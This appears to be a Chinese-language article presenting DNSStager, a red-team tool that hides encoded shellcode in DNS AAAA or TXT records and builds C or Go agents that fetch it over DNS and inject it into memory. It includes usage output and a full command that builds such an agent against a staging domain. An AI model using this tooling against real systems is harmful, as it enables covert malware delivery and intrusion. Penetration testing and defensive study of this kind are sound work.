![](https://image.3001.net/images/20210825/1629901738_612653aa4d7202e662e9b.png!small)

## 关于DNSStager

DNSStager是一个基于Python开发的开源项目，可以帮助广大研究人员使用DNS来隐藏和传输Payload。

DNSStager可以创建一个恶意DNS服务器，并负责处理我们域名相关的DNS请求，然后将Payload隐藏在响应中的指定记录请求中，比如说“AAAA”记录或“TXT”记录，而且DNSStager还会使用各种不同的算法来对Payload进行编码。

DNSStager能够生成基于C或Golang的自定义代理，主要负责解析一系列域名、获取Payload、解码Payload，并将其注入至内存中。

我们也可以根据自己的需要编辑DNSStager代理的代码。并使用自定义执行技术来构建代码。

DNSStager的主要目标就是帮助红队人员或渗透测试人员使用DNS作为隐蔽信道来传输Payload。

## 运行机制

根据你的DNS解析选项，DNSStager会对你的Payload进行分块，并将每一块以子域名响应的形式进行存储。

比如说，你选择使用IPv6选项来获取Payload，那么DNS响应将如下所示：

    
    
    cloud-srv-1.test.mydnsserver.live. 300 IN AAAA 5648:31d2:6548:8b52:6048:8b52:1848:8b52

其中的“5648:31d2:6548:8b52:6048:8b52:1848:8b52”就是Payload的一部分。

因此，代理将会解析某些域名来获取Payload，然后对其进行解码，最终将其注入至内存中。

当前版本的DNSStager仅支持两种记录，即“AAAA”记录和“TXT”记录，你可以使用异或计算来对Payload进行编码（AAAA记录），如果你选择的是TXT记录的话，默认会使用Base64来进行编码。

## DNSStager核心功能

在IPv6记录中隐藏和解析Payload；

在TXT记录中隐藏和解析Payload；

使用异或编码器编码Payload；

使用Base64编码器编码Payload；

纯C开发的代理，支持自定义配置；

纯Golang开发的代理，支持自定义配置；

支持在每个DNS请求间隔一定休眠时间；

更多功能即将上线...

## 工具要求

我们可以使用下列命令来安装DNSStager所需的Python依赖：

    
    
    pip3 install -r requirements.txt

我们还需要安装Golang v1.16.3环境，并确保安装好了下列Golang包：

> golang.org/x/sys
>
> github.com/miekg/dns

除此之外，还需要安装好ming-w64：

    
    
    apt install mingw-w64

## 工具安装

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/mhaskar/DNSStager

接下来，我们还需要使用下列命令安装所需的依赖组件：

    
    
    pip3 install -r requirements.txt

安装完成之后，我们以root用户执行DNSStager便可看到如下所示的界面：

    
    
    ┌─[askar@hackbook]─[/opt/redteaming/DNSStager]
    
    └──╼ $sudo ./dnsstager.py
    
     
    
     
    
     
    
    ██████╗░███╗░░██╗░██████╗░██████╗████████╗░█████╗░░██████╗░███████╗██████╗░
    
    ██╔══██╗████╗░██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝░██╔════╝██╔══██╗
    
    ██║░░██║██╔██╗██║╚█████╗░╚█████╗░░░░██║░░░███████║██║░░██╗░█████╗░░██████╔╝
    
    ██║░░██║██║╚████║░╚═══██╗░╚═══██╗░░░██║░░░██╔══██║██║░░╚██╗██╔══╝░░██╔══██╗
    
    ██████╔╝██║░╚███║██████╔╝██████╔╝░░░██║░░░██║░░██║╚██████╔╝███████╗██║░░██║
    
    ╚═════╝░╚═╝░░╚══╝╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝    
    
     
    
        Beta Version                           Hide your payload in DNS
    
     
    
    [-] Please specify a domain name using --domain

## 工具使用

    
    
    ┌─[askar@hackbook]─[/opt/redteaming/DNSStager]
    
    └──╼ $sudo ./dnsstager.py -h
    
    usage: dnsstager.py [-h] [--domain DOMAIN] [--payloads] [--prefix PREFIX]
    
                        [--payload PAYLOAD] [--output OUTPUT]
    
                        [--shellcode_path SHELLCODE_PATH] [--xorkey XORKEY]
    
                        [--sleep SLEEP]
    
     
    
    DNSStager main parser
    
     
    
    optional arguments:
    
      -h, --help            show this help message and exit
    
      --domain DOMAIN       The domain you want to use as staging host
    
      --payloads            show all payloads
    
      --prefix PREFIX       Prefix to use as part of your subdomain schema
    
      --payload PAYLOAD     Payload to use, see --payloads for more details
    
      --output OUTPUT       Agent output path
    
      --shellcode_path SHELLCODE_PATH
    
                            Shellcode file path
    
      --xorkey XORKEY       XOR key to encode your payload with
    
      --sleep SLEEP         sleep for N seconds between each DNS request

## DNSStager Payload

如需查看可用的DNSStager Payload，我们可以使用“./dnsstager.py --payloads”命令：

    
    
    ┌─[askar@hackbook]─[/opt/redteaming/DNSStager]
    
    └──╼ $sudo ./dnsstager.py --payloads
    
     
    
    [+] 6 DNSStager payloads Available
    
     
    
    x64/c/ipv6 Resolve your payload as IPV6 addresses xored with custom key via compiled x64 C code
    
    x86/c/ipv6 Resolve your payload as IPV6 addresses xored with custom key via compiled x86 C code
    
    x64/golang/txt Resolve your payload as TXT records encoded using base64 compiled x64 GoLang code
    
    x64/golang/ipv6 Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x64 GoLang code
    
    x86/golang/txt Resolve your payload as TXT records encoded using base64 compiled x86 GoLang code
    
    x86/golang/ipv6 Resolve your payload as IPV6 addresses encoded with custom key using byte add encoding via compiled x86 GoLang code

## DNSStager的IPv6记录使用样例

下面的例子中，我们将使用DNSStager并以IPv6记录作为信道来解析Payload，域名为“test.mydnsserver.live”，前缀为“cloud-srv-”，生成的代理为已编译的“x64 C”，使用了“0x10”作为密钥来进行编码：

    
    
    sudo ./dnsstager.py --domain test.mydnsserver.live --payload x64/c/ipv6 --output /tmp/a2.exe --prefix cloud-srv- --shellcode_path ~/payload.bin --sleep 1 --xorkey 0x10

输出结果：

![](https://image.3001.net/images/20210825/1629901851_6126541b14cea70bca2e8.png!small)

如需检测一切是否正常，可以向“cloud-srv-0.test.mydnsserver.live”发送DNS查询请求：

![](https://image.3001.net/images/20210825/1629901857_61265421c509b23cb29e4.png!small)

## 许可证协议

本项目的开发与发布遵循GPL-3.0开源许可证协议。

## 项目地址

 **DNSStager：** 【[ _GitHub传送门_](https://github.com/mhaskar/DNSStager)】

## 参考资料

[ _https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns_](https://shells.systems/unveiling-dnsstager-a-tool-to-hide-your-payload-in-dns)

